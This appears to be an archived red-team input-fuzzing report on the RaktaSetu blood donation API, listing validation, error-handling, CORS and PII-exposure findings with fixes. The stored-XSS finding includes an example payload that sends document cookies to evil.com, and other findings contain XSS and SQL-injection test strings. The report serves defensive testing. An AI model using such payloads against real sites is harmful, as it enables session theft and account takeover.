# Red-Team Input Fuzzing Report — RaktaSetu Blood Donation Platform

> **Status: Archived.** Historical security test evidence; see [docs/security/security-controls.md](./docs/security/security-controls.md) and [docs/repository-health.md](./docs/repository-health.md) for current guidance.

**Date:** 2026-07-08  
**Tester:** Specialist Testing Agent  
**Backend:** `https://fonts-publish-studios-toolbar.trycloudflare.com/api` (Cloudflare Tunnel) + `http://localhost:3001/api` (Local)  
**Frontend:** `https://llMr-Sweetll.github.io/raktasetu-app/`  
**Test Type:** `red-team-input-fuzzing` — Invalid input against ALL API endpoints

---

## CRITICAL Issues

### [Severity: CRITICAL] — Negative `units_needed` Accepted in Hospital Requests
- **File:** `backend/src/routes/hospital.js` line 121
- **Issue:** The validation check `if (!blood_group || !units_needed || !urgency)` only rejects falsy values (`0`, `null`, `undefined`, `''`). Since `-5` is truthy in JavaScript, it passes validation and is stored in the database as a negative blood unit requirement.
- **Impact:** A hospital can create a request for `-5` units of blood. This corrupts data integrity and could break downstream logic (credit calculations, inventory tracking, etc.).
- **Verification:** `POST /api/hospital/requests` with `{"blood_group":"O+","units_needed":-5,"urgency":"urgent"}` → `HTTP 201` with request created containing `units_needed: -5`.
- **Fix:** Add explicit numeric validation: `if (!Number.isInteger(units_needed) || units_needed < 1 || units_needed > 100)` or similar.

### [Severity: CRITICAL] — Very Large `units_needed` Accepted in Hospital Requests
- **File:** `backend/src/routes/hospital.js` line 121
- **Issue:** No upper bound validation on `units_needed`. A value of `999999` is accepted and stored.
- **Impact:** Could cause integer overflow, database bloat, or DoS when the system tries to process a request for nearly 1 million units. Displayed to donors, causing confusion.
- **Verification:** `POST /api/hospital/requests` with `{"blood_group":"O+","units_needed":999999,"urgency":"urgent"}` → `HTTP 201` with request created.
- **Fix:** Add `units_needed > 0 && units_needed <= MAX_UNITS` validation (e.g., max 50 units).

### [Severity: CRITICAL] — Negative `ping_radius_km` Accepted in Donor Profile Update
- **File:** `backend/src/routes/donor.js` line 411
- **Issue:** The profile update endpoint pushes `ping_radius_km` directly into the SQL UPDATE with zero validation. A negative value is stored in the database.
- **Impact:** A donor with `ping_radius_km: -5` will never see any nearby requests because the distance filter `r.distance_km <= radius` will always be false for positive distances. This silently breaks the donor experience.
- **Verification:** `PATCH /api/donor/profile` with `{"ping_radius_km":-5}` → `HTTP 200` with `ping_radius_km: -5` stored.
- **Fix:** Add `if (typeof ping_radius_km !== 'number' || ping_radius_km < 1 || ping_radius_km > 100)` validation before updating.

### [Severity: CRITICAL] — Very Large `ping_radius_km` Accepted in Donor Profile Update
- **File:** `backend/src/routes/donor.js` line 411
- **Issue:** No upper bound on `ping_radius_km`. `999999` is accepted and stored.
- **Impact:** A donor with a massive radius will be flooded with requests from across the entire country/world, causing notification spam and computational load. The haversine calculation will run against every open request in the database.
- **Verification:** `PATCH /api/donor/profile` with `{"ping_radius_km":999999}` → `HTTP 200` with `ping_radius_km: 999999` stored.
- **Fix:** Add upper bound check (e.g., max 50-100 km).

---

## HIGH Issues

### [Severity: HIGH] — Invalid UUID Path Parameter Causes 500 Internal Server Error
- **File:** `backend/src/routes/hospital.js` line 254
- **Issue:** `router.get('/requests/:id', ...)` passes `req.params.id` directly to a PostgreSQL parameterized query where the column type is `uuid`. When the parameter is not a valid UUID format (e.g., `invalid-uuid`), PostgreSQL throws a type error that is not caught inside the route handler, propagating to the Express error handler as 500.
- **Impact:** This is a potential DoS vector — an attacker can repeatedly hit this endpoint with invalid UUIDs to generate 500 errors and noise in logs. While the response doesn't leak SQL queries, it indicates unhandled edge cases.
- **Verification:** `GET /api/hospital/requests/invalid-uuid` → `HTTP 500` with `{"success":false,"error":"Failed to fetch request detail"}`.
- **Fix:** Validate UUID format before querying: `if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(id)) return res.status(400).json({ error: 'Invalid request ID' })`.

### [Severity: HIGH] — SQL-Injection-Like String in UUID Path Causes 500 Error
- **File:** `backend/src/routes/hospital.js` line 254
- **Issue:** Same as above. When a URL-encoded string like `'%20OR%20'1'='1` is passed as the `:id` parameter, PostgreSQL fails to cast it to UUID, causing a 500 error. Note: the query itself is parameterized and NOT vulnerable to SQL injection, but the unhandled error is a stability issue.
- **Impact:** Same DoS vector. Could be used to trigger error storms.
- **Verification:** `GET /api/hospital/requests/'%20OR%20'1'='1` → `HTTP 500`.
- **Fix:** Same UUID format validation as above.

### [Severity: HIGH] — CORS Preflight from Unauthorized Origin Returns 500 Instead of 403
- **File:** `backend/src/server.js` line 43-48
- **Issue:** The CORS middleware uses a custom origin callback that throws `new Error('CORS blocked: origin not allowed')` for unauthorized origins. When an `OPTIONS` preflight request arrives with `Origin: https://evil.com`, the CORS error is caught by the Express error handler, which returns `HTTP 500`.
- **Impact:** Misleading HTTP status. A 500 error suggests a server bug rather than an intentional security rejection. This can confuse monitoring tools and waste debugging time.
- **Verification:** `OPTIONS` to `/api/auth/login` with `Origin: https://evil.com` → `HTTP 500` with `{"success":false,"error":"Internal server error"}`.
- **Fix:** In the CORS error handler, set `err.status = 403` before passing to `next(err)` so the error handler returns 403 instead of 500.

### [Severity: HIGH] — No Input Validation on Any Profile Update Fields
- **File:** `backend/src/routes/donor.js` line 395-411
- **Issue:** The `PATCH /api/donor/profile` endpoint blindly accepts any value for `name`, `phone`, `blood_group`, `latitude`, `longitude`, `city`, `state`, and `ping_radius_km`. No type checking, no range validation, no format validation, no XSS sanitization.
- **Impact:** Attackers can store arbitrary data in any field, including XSS payloads, extremely large strings, invalid coordinates, or invalid blood group values. No `blood_group` enum validation means a donor can set `blood_group: "Z-"` and break the compatibility matching algorithm.
- **Verification:** `PATCH /api/donor/profile` with `{"name":"<img src=x onerror=alert(1)>","blood_group":"Z-","latitude":999,"longitude":999}` → `HTTP 200` with all values stored.
- **Fix:** Add Joi or Zod schema validation for every field. Sanitize `name` with `xss` or `DOMPurify`. Validate `blood_group` against the allowed enum. Validate `latitude` (-90 to 90) and `longitude` (-180 to 180).

### [Severity: HIGH] — `/api/admin/broadcast` Endpoint Does Not Exist
- **File:** `backend/src/routes/admin.js` (missing)
- **Issue:** The admin route file only defines `GET /users`, `GET /requests`, and `GET /stats`. There is no `POST /broadcast` endpoint. However, the frontend may expect it (or the API documentation might mention it).
- **Impact:** Any frontend code or admin panel calling `/api/admin/broadcast` will receive `HTTP 404`. This is a broken contract.
- **Verification:** `POST /api/admin/broadcast` with admin token → `HTTP 404`.
- **Fix:** Either implement the endpoint or remove it from frontend/documentation.

---

## MEDIUM Issues

### [Severity: MEDIUM] — No XSS Sanitization on User Name Fields
- **File:** `backend/src/routes/auth.js` line 53-62, `backend/src/routes/donor.js` line 404
- **Issue:** The `name` field is stored exactly as provided without any HTML sanitization or XSS encoding. If the frontend renders user names directly in HTML (e.g., in donor lists, hospital dashboards, notification titles), this creates a stored XSS vulnerability.
- **Impact:** A donor could register with `name: "<script>alert(1)</script>"` or `name: "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"`. When this name is rendered by a hospital or admin, the script executes in their browser, potentially stealing session tokens or performing actions on their behalf.
- **Verification:** Code review shows `name` is passed directly to SQL without sanitization. Frontend code review would be needed to confirm if the name is rendered unsafely, but the backend should never store unsanitized HTML.
- **Fix:** Sanitize `name` on both registration and profile update using a library like `xss` or `DOMPurify`. Alternatively, validate that `name` only contains letters, spaces, and basic punctuation.

### [Severity: MEDIUM] — Admin Users Endpoint Returns All User Emails and Phone Numbers
- **File:** `backend/src/routes/admin.js` line 13-19
- **Issue:** `GET /api/admin/users` returns `id, email, phone, name, role, blood_group, city, is_verified, is_on_call, created_at` for every user. While password hashes are excluded, this is still a significant data exposure.
- **Impact:** Any compromised admin account (or admin token) exposes the full user directory including PII. Under DPDP Act India 2023, this may violate data minimization and purpose limitation principles.
- **Verification:** `GET /api/admin/users` with admin token → returns full user list with emails and phone numbers.
- **Fix:** Add pagination. Consider whether the frontend truly needs email and phone for all users, or if a subset of fields suffices. Also consider whether the admin endpoint should be restricted further.

### [Severity: MEDIUM] — OPTIONS Response Exposes All HTTP Methods
- **File:** `backend/src/server.js` line 41-50
- **Issue:** The CORS preflight response includes `Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE`. This exposes the full API surface to attackers, including `PUT`, `PATCH`, and `DELETE` methods that the frontend may not actually use.
- **Impact:** Information disclosure. Attackers can enumerate which methods are available on endpoints without authenticating.
- **Verification:** `OPTIONS` to any endpoint → `Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE`.
- **Fix:** Restrict to only the methods the application actually uses: `GET, POST, PATCH`.

### [Severity: MEDIUM] — Rate Limit Headers Expose Exact Counter State
- **File:** `backend/src/server.js` line 54-60
- **Issue:** The rate limiter includes `RateLimit-Remaining`, `RateLimit-Reset`, and `RateLimit-Limit` in every response. This allows attackers to precisely time their requests to evade rate limits or perform low-and-slow attacks.
- **Impact:** Attackers can optimize brute force timing to stay just under the threshold.
- **Verification:** `GET /health` → includes `RateLimit-Remaining: 53`, `RateLimit-Reset: 658`, `RateLimit-Limit: 100`.
- **Fix:** Either disable `standardHeaders` in the rate limiter config, or set it to `false` to not expose these headers.

### [Severity: MEDIUM] — Donor Phone Numbers Exposed to Hospital Endpoints
- **File:** `backend/src/routes/hospital.js` line 154, 520, 503
- **Issue:** The hospital endpoints (`/donors`, `/requests/:id`) return donor phone numbers in plaintext. Hospitals get full access to donor phone numbers, names, and locations.
- **Impact:** While this is arguably needed for blood donation coordination, it is a significant PII exposure. Under DPDP Act, this should be documented in the privacy notice and limited to only necessary data.
- **Verification:** `GET /api/hospital/donors` → returns `phone` for every donor. `GET /api/hospital/requests/:id` → returns `donor_phone`.
- **Fix:** Consider masking phone numbers (e.g., `+91*****3210`) and only revealing full numbers after a donor has accepted a request. This aligns with the "minimum necessary" principle.

### [Severity: MEDIUM] — Inconsistent Numeric Validation Logic (Zero vs. Negative)
- **File:** `backend/src/routes/hospital.js` line 121
- **Issue:** The `units_needed` validation uses `!units_needed` which rejects `0` (falsy) but accepts `-5` (truthy). This is inconsistent and confusing. The intent is clearly to reject zero and negative values, but the implementation only catches zero.
- **Impact:** Developers might incorrectly assume zero is the only invalid value, while negatives slip through.
- **Verification:** `units_needed: 0` → `HTTP 400`. `units_needed: -5` → `HTTP 201`.
- **Fix:** Use explicit numeric checks: `Number.isInteger(units_needed) && units_needed > 0 && units_needed <= MAX`.

### [Severity: MEDIUM] — No Bounds on `radius_km` in Hospital Request Creation
- **File:** `backend/src/routes/hospital.js` line 136
- **Issue:** The `radius_km` parameter is used with a fallback to `10` (or `25` for rare blood types), but there is no upper bound. A hospital could set `radius_km: 99999` and ping every donor in the country.
- **Impact:** Notification spam, database load, and potentially violating donor consent (they only consented to be contacted within a reasonable radius).
- **Verification:** `POST /api/hospital/requests` with `{"radius_km":99999}` → accepted.
- **Fix:** Cap `radius_km` at a reasonable maximum (e.g., 50 km for common, 100 km for rare).

### [Severity: MEDIUM] — Malformed JSON Body Logs Full Request Content in Error Messages
- **File:** `backend/src/server.js` line 128-135
- **Issue:** The Express error handler logs `console.error('Express error:', err)`. For body-parser JSON errors, this includes the raw malformed request body in the log output. While the API response doesn't leak this, server logs may contain sensitive input data.
- **Impact:** Log files could contain passwords, tokens, or PII from malformed requests. If logs are shipped to a third party (e.g., Cloudflare, Logtail), this is a data exposure risk.
- **Verification:** Backend logs showed `Express error: SyntaxError: Unexpected token '+', ..."body...` containing the full malformed JSON body including phone numbers.
- **Fix:** Sanitize logged errors. Don't log `err.body` directly. Consider using a structured logger that redacts sensitive fields.

---

## LOW Issues

### [Severity: LOW] — `hospital_name` in Notifications Uses `req.user.name` Instead of Hospital Record Name
- **File:** `backend/src/routes/hospital.js` line 178, `backend/src/server.js` line 212, 308
- **Issue:** The notification title uses `req.user.name || 'Hospital'` which is the user's display name, not necessarily the official hospital name from the `hospitals` table. This is inconsistent.
- **Impact:** Minor UX inconsistency. A hospital admin's personal name might appear in a notification instead of the hospital's official name.
- **Fix:** Use `h.name` (from the `hospitals` table) instead of `req.user.name` in notification generation.

### [Severity: LOW] — Donor Profile Update Allows Empty String for `name`
- **File:** `backend/src/routes/donor.js` line 404
- **Issue:** `if (name !== undefined)` accepts empty strings (`""`), which could result in a donor with no visible name.
- **Impact:** Minor UX issue. Empty names display poorly in the UI.
- **Fix:** Add `name.trim().length > 0` validation.

### [Severity: LOW] — `next_eligible_date` Logic Uses Date Manipulation Without Timezone Awareness
- **File:** `backend/src/routes/hospital.js` line 449-451
- **Issue:** `nextEligible.setDate(nextEligible.getDate() + 56)` calculates the next eligible date based on server local time. For a global user base, this may be off by a day depending on timezone.
- **Impact:** Donors might be incorrectly shown as eligible or ineligible based on timezone differences.
- **Fix:** Use a timezone-aware date library like `date-fns` or `dayjs` and store dates in UTC.

---

## Verified Working (Security Controls That Passed)

| Test | Result | Status |
|------|--------|--------|
| Missing token on protected endpoint | `HTTP 401` — `Authentication required` | ✅ PASS |
| Wrong role token on donor endpoint | `HTTP 403` — `Insufficient permissions` | ✅ PASS |
| Wrong role token on admin endpoint | `HTTP 403` — `Insufficient permissions` | ✅ PASS |
| Donor token on hospital dashboard | `HTTP 403` — `Insufficient permissions` | ✅ PASS |
| JWT Algorithm `none` | `HTTP 401` — `Invalid token` | ✅ PASS |
| JWT role tampering (fake signature) | `HTTP 401` — `Invalid token` | ✅ PASS |
| Invalid/expired token | `HTTP 401` — `Invalid token` | ✅ PASS |
| Password hash NOT in `/api/auth/me` | Confirmed absent | ✅ PASS |
| Password hash NOT in `/api/admin/users` | Confirmed absent | ✅ PASS |
| No `Server`/`X-Powered-By` header leaks | Helmet active | ✅ PASS |
| 404 handler returns generic message | `Endpoint not found` | ✅ PASS |
| Invalid blood group | `HTTP 400` — `Invalid blood group` | ✅ PASS |
| Invalid urgency | `HTTP 400` — `urgency must be scheduled, urgent, or critical` | ✅ PASS |
| Invalid status | `HTTP 400` — `status must be open, filled, or closed` | ✅ PASS |
| Missing required fields | `HTTP 400` — `blood_group, units_needed, and urgency are required` | ✅ PASS |
| Invalid ref_code | `HTTP 404` — `Invalid reference code` | ✅ PASS |
| Missing ref_code/donor_id | `HTTP 400` — `donor_id or ref_code required` | ✅ PASS |
| Empty body with JSON content-type | `HTTP 400` — `Email or phone, and password are required` | ✅ PASS |
| Null fields in login | `HTTP 400` — `Email or phone, and password are required` | ✅ PASS |
| Array injection in login | `HTTP 401` — `Invalid credentials` | ✅ PASS |
| Oversized payload (>10KB) | `HTTP 413` — `PayloadTooLargeError` | ✅ PASS |
| Brute force rapid requests | `HTTP 429` — `Too many requests` after ~10 attempts | ✅ PASS |
| Password enumeration (wrong pass vs wrong user) | Same generic message: `Invalid credentials` | ✅ PASS |
| Helmet security headers present | CSP, HSTS, X-Frame-Options, etc. | ✅ PASS |
| CORS from authorized origin | `HTTP 204` with proper CORS headers | ✅ PASS |
| Donor on-call with string | `HTTP 400` — `is_on_call boolean required` | ✅ PASS |
| Wrong content-type (text/plain) | Still parses JSON body, returns `HTTP 400` | ✅ PASS (no crash) |
| Malformed JSON | `HTTP 400` — `Internal server error` (generic, no leak) | ✅ PASS |

---

## Summary

| Severity | Count |
|----------|-------|
| **Critical** | 4 |
| **High** | 5 |
| **Medium** | 9 |
| **Low** | 3 |
| **Verified Working** | 26 |

### Critical Issues Summary
1. **Negative `units_needed`** accepted in hospital requests (`-5` → `201`)
2. **Very large `units_needed`** accepted in hospital requests (`999999` → `201`)
3. **Negative `ping_radius_km`** accepted in donor profile (`-5` → `200`)
4. **Very large `ping_radius_km`** accepted in donor profile (`999999` → `200`)

### High Issues Summary
1. Invalid UUID in path causes **500 Internal Server Error** (unhandled PostgreSQL type error)
2. SQL-injection-like string in UUID path causes **500** (same unhandled error)
3. CORS preflight from unauthorized origin returns **500** instead of **403**
4. **No input validation** on any donor profile update field (XSS, invalid coords, invalid blood group all accepted)
5. **`/api/admin/broadcast`** endpoint does not exist (returns `404`)

### Medium Issues Summary
1. No XSS sanitization on `name` fields (stored XSS risk)
2. Admin users endpoint exposes full PII (email, phone) for all users
3. OPTIONS response exposes all HTTP methods (`PUT`, `PATCH`, `DELETE`)
4. Rate limit headers expose exact counter state (`RateLimit-Remaining`, `RateLimit-Reset`)
5. Hospital endpoints return donor phone numbers in plaintext
6. Inconsistent validation: `0` rejected but `-5` accepted for numeric fields
7. No bounds on `radius_km` in hospital requests
8. Malformed JSON errors log full request body in server logs
9. No `blood_group` enum validation on profile update

### Low Issues Summary
1. Notification titles use `req.user.name` instead of official hospital name
2. Empty string `name` accepted in profile update
3. `next_eligible_date` calculation not timezone-aware

---

## Recommended Priority Fixes

1. **CRITICAL:** Add `Number.isInteger(val) && val > 0 && val <= MAX` validation to `units_needed`, `ping_radius_km`, and `radius_km`.
2. **CRITICAL:** Add Joi/Zod schema validation to `PATCH /api/donor/profile`.
3. **HIGH:** Add UUID format regex validation before all database queries using UUID parameters.
4. **HIGH:** Fix CORS error handler to return `403` instead of `500` for unauthorized origins.
5. **HIGH:** Implement or remove `/api/admin/broadcast` endpoint.
6. **MEDIUM:** Sanitize `name` fields against XSS on registration and profile update.
7. **MEDIUM:** Limit admin `/users` endpoint to necessary fields only, add pagination.
8. **MEDIUM:** Restrict `Access-Control-Allow-Methods` to `GET, POST, PATCH`.
9. **MEDIUM:** Disable `standardHeaders` on rate limiter or at least hide `RateLimit-Reset`.
10. **MEDIUM:** Consider masking donor phone numbers in hospital endpoints until donor accepts request.
